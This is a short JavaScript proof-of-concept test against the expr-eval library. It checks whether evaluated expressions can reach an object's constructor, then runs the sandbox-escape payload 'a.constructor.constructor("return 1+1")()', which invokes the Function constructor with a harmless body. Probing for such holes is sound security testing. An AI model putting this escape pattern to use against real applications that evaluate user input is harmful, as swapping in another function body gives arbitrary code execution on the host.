import { Parser } from 'expr-eval';

const parser = new Parser();
const context = {
    a: {}
};

try {
    console.log("Testing constructor access...");
    const expr = 'a.constructor';
    const result = parser.evaluate(expr, context);
    console.log(`Result of a.constructor: ${result}`);

    if (result === Object) {
        console.log("CRITICAL: Constructor access allowed!");
    } else {
        console.log("Constructor access seems blocked or safe.");
    }

    const exploit = 'a.constructor.constructor("return 1+1")()';
    const result2 = parser.evaluate(exploit, context);
    console.log(`Result of exploit: ${result2}`);
} catch (e) {
    console.log(`Caught error: ${e.message}`);
}
